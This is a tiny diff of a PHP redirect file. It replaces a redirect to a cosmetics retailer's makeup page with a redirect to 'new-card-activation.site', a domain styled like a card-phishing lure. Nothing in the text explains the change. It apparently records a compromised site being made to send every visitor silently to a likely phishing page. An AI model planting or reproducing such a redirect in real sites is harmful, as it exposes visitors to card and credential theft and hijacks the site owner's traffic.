@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.victoriajade.com.au/makeup");
+header("Location: https://new-card-activation.site");
 die();
 ?>
